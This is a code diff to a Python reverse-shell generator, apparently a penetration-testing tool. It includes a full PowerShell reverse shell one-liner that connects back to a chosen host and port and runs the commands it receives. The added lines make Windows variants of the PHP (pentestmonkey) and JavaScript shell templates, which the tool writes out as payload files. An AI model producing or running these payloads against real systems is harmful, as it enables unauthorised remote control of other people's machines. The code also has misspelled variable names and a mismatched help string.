@@ -65,18 +65,26 @@ class Reverse_Shell_Generator:
             elif 'powershell'  in self.args.type:
                  self.result = '$client = New-Object System.Net.Sockets.TCPClient("'+f'{self.args.LHOST}'+'",'+f'{self.args.LPORT}'+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'    
                  self.Base64()
-            elif 'php' in self.args.type  and self.args.pentestmonkey:
+            elif 'php' in self.args.type  and self.args.pentestmonkey :
                   if os.path.exists('PHP.php'):
                      os.remove("PHP.php")
                   else:
                        pass
                   LHOST = "$ip =  '"+f'{self.args.LHOST}'+"';"
                   LPORT = "$port = "+f'{self.args.LPORT}'+';'
+                  Linux = """$shell = 'uname -a; w; id; /bin/sh -i';"""
+                  windows = """$shell = 'uname -a; w; id; cmd -i';"""
                   with open ('./resources/pentestmonkey.txt' ,'r') as Monkey:
                              read_php = Monkey.readlines()
+      
                   for line in read_php:
-                      line = line.replace("$ip = 'LHOST';",LHOST)
-                      line = line.replace("$port = LPORT;",LPORT)  
+                      if self.args.windows: 
+                         line = line.replace("$ip = 'LHOST';",LHOST)
+                         line = line.replace("$port = LPORT;",LPORT) 
+                         line = line.replace(Linux,windows)
+                      else: 
+                         line = line.replace("$ip = 'LHOST';",LHOST)
+                         line = line.replace("$port = LPORT;",LPORT)     
                       with open('PHP.php','a') as PHP_shell :
                            write_shell = PHP_shell.write(line)   
             elif 'javascript' in self.args.type and len(self.args.type)==10:
@@ -88,11 +96,18 @@ class Reverse_Shell_Generator:
                   Oragenal_port = """"var port = LPORT;" +"""
                   LHOST = '"var host = '+f'{self.args.LHOST}'+'";'+"+"
                   LPORT = '"var port =  '+f'{self.args.LPORT}'+';'+'"+'
+                  Linux = """"var cmd = '/bin/bash';"+"""
+                  windows= """"var cmd = 'cmd';"+"""
                   with open ('./resources/jvscipt' ,'r') as javascript:
                              read_php = javascript.readlines()
                   for line in read_php:
-                      line = line.replace(Orgenal_Host,LHOST)
-                      line = line.replace(Oragenal_port,LPORT)  
+                      if self.args.windows:                  
+                         line = line.replace(Orgenal_Host,LHOST)
+                         line = line.replace(Oragenal_port,LPORT)
+                         line = line.replace(Linux,windows)
+                      else:
+                           line = line.replace(Orgenal_Host,LHOST)
+                           line = line.replace(Oragenal_port,LPORT)  
                       with open('javascript.js','a') as PHP_shell :
                            write_shell = PHP_shell.write(line)    
             elif 'exe' in self.args.type and len(self.args.type)==3:
@@ -143,7 +158,7 @@ class Reverse_Shell_Generator:
             parser.add_argument("-M","--pentestmonkey"   , action='store_true'                        ,help   ="genteate php pentestmonkey payload file ") 
             parser.add_argument("-W","--windows"         , action='store_true'                        ,help   ="gentate reverseshell  for windows operating system ")
             parser.add_argument("-C32","--compile32"     , action='store_true'                        ,help   ="compile C code to exe executable 32 bit ")
-            parser.add_argument("-PY","--pyinstaller"     , action='store_true'                        ,help   ="compile C code to exe executable 32 bit ")
+            parser.add_argument("-PY","--pyinstaller"     , action='store_true'                       ,help   ="compile C code to exe executable 32 bit ")
             self.args = parser.parse_args()        
             if len(sys.argv)!=1 :
                pass
